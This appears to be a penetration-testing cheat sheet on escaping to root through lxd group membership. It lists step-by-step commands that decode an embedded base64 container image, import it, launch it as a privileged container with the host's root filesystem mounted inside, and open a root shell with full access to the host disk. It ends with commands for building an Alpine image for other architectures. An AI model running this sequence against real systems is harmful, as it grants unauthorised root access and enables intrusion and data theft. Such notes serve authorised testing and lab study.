---
title: "lxd"
date: 2024-6-28
tags: ["lxd", "lxc", "privesc", "container", "escape"]
---

---
### Basic Commands

<div>

```bash
# Check if user in lxd group
id
```

```bash
# List containers
lxc list
```

```bash
# List images
lxc image list
```

</div>

<br>

---

### Abuse #1: Mount host's file system

<div>

```bash
# Upload a 656 bytes conatiner image
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > test.tar.bz2
```

```bash
# Import image
lxc image import test.tar.bz2 --alias testImage
```

```bash
# Check image
lxc image list
```

```bash
# Init VM
lxc init testImage testVM -c security.privileged=true
```

```bash
# Mount the host /
lxc config device add testVM realRoot disk source=/ path=r
```

```bash
# Start VM
lxc start testVM
```

```bash
# Check containers
lxc list
```

```bash
# Execute as root inside container
lxc exec testVM -- /bin/bash
```

```bash
# We have full access on host disk thru /r/
ls -la /r/root
```

</div>

<br>

---

### Build image for other arch

<div>

```bash
git clone git clone https://github.com/saghul/lxd-alpine-builder
```

```bash
cd lxd-alpine-builder      
```

```bash
# For example arch i686
sudo ./build-alpine -a i686
```

</div>

<br>